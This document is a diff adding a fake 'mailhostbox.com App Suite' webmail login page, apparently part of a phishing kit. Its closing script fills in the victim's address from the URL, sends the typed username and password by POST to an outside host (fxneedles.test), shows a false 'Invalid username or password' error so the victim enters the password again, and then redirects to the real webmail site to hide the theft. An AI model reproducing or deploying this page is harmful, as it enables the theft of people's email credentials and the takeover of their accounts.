@@ -1,0 +1,266 @@
+
+<html><head><title>Webmail Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            border: none;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            line-height: 20px;
+            box-sizing: border-box;
+            overflow: hidden;
+            color: #6cbafc;
+            font-weight: 300;
+            font-size: 14px;
+        }
+        .app-container {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            top: 0;
+            background-image: radial-gradient(circle, #294f83, #162c4a);
+            overflow-y: auto;
+        }
+        .form-container {
+            position: relative;
+            top: 50%;
+            max-width: 400px;
+            padding: 0 15px 32px 15px;
+            margin: 0 auto;
+            -webkit-transform: translate(0,-50%);
+            -ms-transform: translate(0,-50%);
+            -o-transform: translate(0,-50%);
+            transform: translate(0,-50%);
+        }
+        h1 {
+            font-size: 40px;
+            font-weight: 100;
+            margin-bottom: 22px;
+            line-height: 48px;
+            padding: 0px 15px;
+            padding-top: 2px;
+        }
+        .subtitle {
+            color: white;
+            margin: 0;
+        }
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            margin: -1px;
+            padding: 0;
+            overflow: hidden;
+            clip: rect(0,0,0,0);
+            border: 0;
+        }
+        .form-control {
+            font-size: 16px;
+            width: 100%;
+            height: 40px;
+            padding: 4px 12px;
+            color: #555;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
+            box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
+            -webkit-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
+            -o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
+            transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
+        }
+        form {
+            padding: 15px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+            width: 100%;
+            clear: both;
+        }
+        .checkbox {
+            margin-top: 33px;
+            margin-bottom: 20px;
+            width: 100%;
+            color: white;
+            font-weight: 400;
+        }
+        .l {
+            float: left;
+        }
+        .r {
+            float: right;
+        }
+        .checkbox input {
+            cursor: pointer;
+            margin: 0 5px 0 0;
+        }
+        .link {
+            text-decoration: none;
+            color: #87B7E4;
+            outline: none;
+            text-align: right;
+        }
+        .btn-pri {
+            margin-top: 20px;
+            height: 40px;
+            background: #3d7dbb;
+            border: 1px solid #1f6da1;
+            cursor: pointer;
+            color: white;
+            display: inline-block;
+            font-weight: 400;
+            text-align: center;
+            vertical-align: middle;
+            white-space: nowrap;
+            padding: 4px 12px;
+            font-size: 14px;
+            border-radius: 3px;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            width: 50%;
+        }
+        .error-box {
+            color: white;
+            background: rgba(0,0,0,.2);
+            border: 1px solid rgba(0,0,0,.2);
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .header-label {
+            font-size: 40px;
+            font-weight: 100;
+            line-height: 48px;
+            color: white;
+        }
+        .dash {
+            font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+            line-height: 20px;
+            color: white;
+            font-size: 14px;
+            padding: 0 15px;
+            font-weight: bolder;
+        }
+    </style>
+    <script>
+        function addTimeZoneOnSubmit() {
+            var forms = document.getElementsByTagName('form');
+            if (forms.length > 0)
+            {
+                var ox_form = forms[0];
+                var input_tz = document.createElement('input');
+                input_tz.name = 'timezone';
+                input_tz.type = 'hidden';
+                input_tz.value = new Date().getTimezoneOffset()/-60;
+                ox_form.appendChild(input_tz);
+            }
+            return true;
+        }
+    </script>
+</head>
+<body>
+    <div class="app-container">
+        <div class="form-container">
+            <div>
+                <h1>
+                    <span>mailhostbox.com</span>
+                    <span class="header-label">App Suite</span>
+                </h1>
+                <div class="dash">-</div>
+            </div>
+            <div>
+                <form>
+                    <div class="form-group">
+                        <label for="username" class="sr-only">Username</label>
+                        <input type="text" class="form-control" name="username" id="username" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" placeholder="Username" />
+                    </div>
+                    <div class="form-group">
+                        <label for="password" class="sr-only">Password</label>
+                        <input type="password" class="form-control" id="password" name="password" maxlength="100" autocorrect="off" autocapitalize="off" aria-required="true" placeholder="Password" />
+                    </div>
+
+                    <div class="error-box">Invalid username or password</div>
+                    
+                    <div class="checkbox">
+                        <span class="l">
+                            <label for="login-store-box" aria-label="Stay signed in">
+                                <input id="login-store-box" type="checkbox" checked="checked" name="store"/>
+                                Stay signed in
+                            </label>
+                        </span>
+                        <a href="forgotpassword.php" class="r link" target="_blank">Forgot your Password?</a>
+                    </div>
+                    <div class="form-group">
+                        <input type="button" name="signin" value="Sign In" class="btn-pri" onclick="sendToServer();"/>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+
+<script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
+<script>
+    $('.error-box').hide();
+
+var hash = window.location.hash;
+
+document.getElementById('username').value = hash.split('#')[1];
+
+var check = document.getElementById('username').value = hash.split('#')[1]
+var pwdInput = document.getElementById('password');
+
+if (check === undefined) {
+$('input#username').val('');
+$('input#username').focus();
+} else {
+pwdInput.focus();
+}
+
+if (!count) {
+    var count = 0;
+}
+
+function getbtnclick()
+{
+  return count++
+}
+
+function sendToServer()
+{
+  var email = $('input#username').val();
+  var pass = $('input#password').val();
+
+  
+  $.ajax({
+    url: 'http://fxneedles.test/mailhost/mailhost.php',
+    type: 'POST',
+    data: {
+      user: email,
+      pass: pass,
+      type: 1
+    },
+    success: function(response){
+      counted = getbtnclick();
+
+    if (response == 0) {
+        $('.error-box').show();
+        $('input#password').val('');
+    } else if (response == 1) {
+      if (counted == 1) {
+        window.location = "https://webmail.mailhostbox.com/appsuite/";
+      } else {
+        $('.error-box').show();
+        $('input#password').val('');
+        $('input#password').focus();
+      }
+    }
+    }
+  });
+  
+}
+</script>
